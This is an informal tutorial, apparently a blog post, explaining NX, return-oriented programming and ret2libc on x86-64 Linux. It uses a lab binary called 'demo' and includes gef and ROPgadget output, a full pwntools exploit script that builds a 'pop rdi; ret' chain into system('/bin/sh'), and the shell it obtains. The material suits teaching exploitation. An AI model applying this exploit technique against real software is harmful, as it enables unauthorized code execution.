# Ret2libc / Ret2sys Introduction:
What is ret2libc? What is ROP?

Let's answer the latter first. What the fuck is ROP, and why in the name of fuck is it so hard to learn about? It's primarily very complex and tedious to learn about
because of the learning curve you pick it up on, usually you learn about ROP to bypass a hand-full user-space and kernel-space program memory protections and exploit mitigations, the main one we're focusing on today is NX, we're not going to worry about other ones right now. 

# NX (No eXecute) / DEP (For windows, data execution prevention):
Basically, for every page table entry there is this specific bit-flag that can be set or not, this bit-flag is known at the NX bit, if this is set it'll mark the memory regions as non-executable, therefore rending trivial buffer-overflow as useless because with the NX bit-flag set in our binaries our program call-stack won't be able to execute code on itself. Knowing how buffer-overflows work we just execute what we put in our buffer but we can't do that with NX. So, what's our solution? ROP I say!

# ROP:
ROP; return-oriented programming, is a code-reuse technique used for situations exactly like this! (For this explanation you might need some assembly background :) ) ROP basically just takes instructions in your program which we can access via exploiting a buffer overflow and using the return address to access these instructions, and chaining them together to preform some sort of task, like popping a shell for example. This can be done with the great power of the standard C library that every single C program will load into memory along side with itself, it'll just happen to include the system function! Couldn't we just load a /bin/sh string into that function call? Yes, yes we can.   

# Calling conventions:
That is done with the power of calling conventions of linux! For this demonstration I will be using the x86-64 linux ABI that uses system V's calling conventions. Each system has it's own ABI thus it's own calling conventions. So what is a calling convention? A calling convention is the order in which you load arguments into a function call, this is done through a special set of CPU registers that are used for storing conventions. These registers are:
```asm
rdi       ; Stores the first parameter of a function.
rsi       ; Stores the section parameter of a function. 
rdx       ; Stores the third parameter of a function.
rcx       ; Stores the fourth parameter of a function. (Rarely used for this however)
r8        ; Stores the fifth parameter of a function.
r9        ; Stores the sixth parameter of a function.
xmm0-xmm7 ; For floating-point valued parameters of functions. 
; If there are more arguments it's pushed onto the stack.
```

# Basic assembly:
Okay now we know what parameters go into which registers, question is how do we get them there? Remember in my explanation of stacks there are 2 operations, push and pop, and there just happens to be 2 instructions: ``push`` (pushing elements onto the stack) and ``pop`` (Popping them off of the stack) the way the mnemonics of the push instruction are layed out are like such: ``pop register`` this will pop what's on the top of the stack into the register provided as an operand. Other
instruction we want to look at is the ``ret`` instruction which is the entire reason why we are able to hijack control-flow from the instruction pointer, so what this instruction does is takes the value RSP is holding and pops that into the instruction pointer, basically just this:
```asm
push rbp
mov rbp, rsp
mov rsp, rbp
pop rbp
pop rip ; Virtually just a ret instruction.
```

# Putting it all together:
Let's brainstorm and slap this all together into a ROP technique that's known as: ``ret2libc`` which is where we basically just take the address of the ``system()`` function in our programs standard library, pushing the ``/bin/sh`` string onto the stack, and popping that into the ``rdi`` register and summoning a shell. Let's see what that looks like. We can do this by obtaining control over control-flow of our program (via overwritting the return address with vulnerable code) and pointing to functions in glibc (such as ``system`` or ``execve``) that are dynamically or statically linked to our programs.

# Binary analysis:
Let's do some basic enumeration of our binary (demo) first:
```ocaml
   ~/Desktop/binexp/stack/ROP/ret2libc ❯ file ./demo                                                                         4.95   6.27G  100%
./demo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4694230837113076ab6afcd88e6a51270a22278f, for GNU/Linux 4.4.0, not stripped
   ~/Desktop/binexp/stack/ROP/ret2libc ❯ 
```
Okay, so it's a 64-bit binary, not stripped of debugging symbols and has an updated standard library version (glibc) that's dynamically-linked to our binary. Interesting.

Let's see if the binary has the NX bit-flag set like we had talked about in the start of this explanation, we can use the ``checksec`` command of gef gdb to ensure it's set:
```asm
gef➤  checksec
[+] checksec for '/home/layta/Desktop/binexp/stack/ROP/ret2libc/demo'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
gef➤ vmmap 
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/layta/Desktop/binexp/stack/ROP/ret2libc/demo
0x00007ffff7dde000 0x00007ffff7de0000 0x0000000000000000 rw- 
0x00007ffff7de0000 0x00007ffff7e06000 0x0000000000000000 r-- /usr/lib/libc-2.33.so
0x00007ffff7e06000 0x00007ffff7f51000 0x0000000000026000 r-x /usr/lib/libc-2.33.so
0x00007ffff7f51000 0x00007ffff7f9d000 0x0000000000171000 r-- /usr/lib/libc-2.33.so
0x00007ffff7f9d000 0x00007ffff7fa0000 0x00000000001bc000 r-- /usr/lib/libc-2.33.so
0x00007ffff7fa0000 0x00007ffff7fa3000 0x00000000001bf000 rw- /usr/lib/libc-2.33.so
0x00007ffff7fa3000 0x00007ffff7fae000 0x0000000000000000 rw- 
0x00007ffff7fc7000 0x00007ffff7fcb000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcb000 0x00007ffff7fcd000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcd000 0x00007ffff7fce000 0x0000000000000000 r-- /usr/lib/ld-2.33.so
0x00007ffff7fce000 0x00007ffff7ff2000  0x0000000000001000 r-x /usr/lib/ld-2.33.so
0x00007ffff7ff2000 0x00007ffff7ffb000   0x0000000000025000 r-- /usr/lib/ld-2.33.so
0x00007ffff7ffb000 0x00007ffff7ffd000   0x000000000002d000 r-- /usr/lib/ld-2.33.so
0x00007ffff7ffd000 0x00007ffff7fff000   0x000000000002f000 rw- /usr/lib/ld-2.33.so
0x00007ffffffde000 0x00007ffffffff000    0x0000000000000000 rw- [stack]
0xffffffffff600000   0xffffffffff601000     0x0000000000000000 --x [vsyscall]
gef➤  

```
So the NX flag-bit has been set for the page entry table segment of the stack, which we can verify because of the stack's permissions in the memory mappings of our program (rw- not -rwx aka: read | write | execute). Let's pwn this bitch.

# Exploitation:
Now for the exploitation section we're going to use some critically important tools that come with gef known as ``ROPgadget`` which will search our binary for possible ROP gadgets so that we can construct a ROP chain (chaining together ROP gadgets to preform some task) but for this instance we're not going to chain ROP gadgets, we're just needing a simple gadget to pop a shell. We will also use some basic techniques to obtain a ``/bin/sh`` string from our binary:
```asm
   ~/Desktop/binexp/stack/ROP/ret2libc ❯ ROPgadget --binary ./demo | grep "rdi"                                               4.95   6.3G  100%
0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x00000000004011d3 : pop rdi ; ret
0x0000000000401118 : sbb ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```
Perfect! Address ``0x00000000004011d3`` of our binary holds a ``pop rdi ; ret``, next up is finding the offset to the return address:
```asm
gef➤  x/xg $rsp
0x7fffffffde68: 0x616161616161616a
gef➤  pattern offset 0x616161616161616a
[+] Searching for '0x616161616161616a'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search) 
gef➤  
```
Seems as if our offset of our return address! Let's try and see if we can come up with some form of skeleton for our exploit and test some things out, but first let's find our string:
```asm
gef➤  find &system,+9999999,"/bin/sh"
0x7ffff7f6bb62
warning: Unable to access 16000 bytes of target memory at 0x7ffff7faa36a, halting search.
1 pattern found.
gef➤  x/s 0x7ffff7f6bb62
0x7ffff7f6bb62: "/bin/sh"
gef➤  
```
We can use that find ``&system,+9999999,"/bin/sh"`` to find a reliable ``/bin/sh`` string in memory, you can also alias a command in gef so you don't have to remember this command. Let's put it all together and pray for the best. (And prepare for the worst)
```py
#!/usr/bin/env python3

from pwn import *

# Process interaction.
p = process("./demo")

def local_exploit():
    rip_offset = 72                   # Return address offset.
    rip_padding = b"A" * rip_offset   # Return address byte-padding.

    pop_rdi = p64(0x4011d3)          # pop rdi ; ret ROP gadget.
    bin_sh = p64(0x7ffff7f6bb62)       # Address to our /bin/sh string.
    system = p64(0x7ffff7e29de0)       # Address to our system(); function in glibc.

    payload = rip_padding            # Return address padding.
    payload += pop_rdi               # pop rdi ; ret. rsp -> address to our /bin/sh string : pop rdi -> rdi : 0x7ffff7f6bb62
    payload += bin_sh                # Address to our /bin/sh string.
    payload += system                # System(); function call.

    p.sendline(payload)              # Sending the bytes to the executable.
    p.interactive()                  # Provides an interactive interface.

local_exploit()                      # Execution of the exploit.
```

# Shell!!!:
```ocaml
   ~/De/b/s/R/ret2libc ❯ ./exploit.py                                  4.04   6.36G  100%
[+] Starting local process './demo': pid 462182
[*] Switching to interactive mode
Looks fine to me!
$ echo "Doesn't look fine to me though!"
Doesn't look fine to me though!
$ whoami
layta
$
```

And that's my take on ret2libc :)
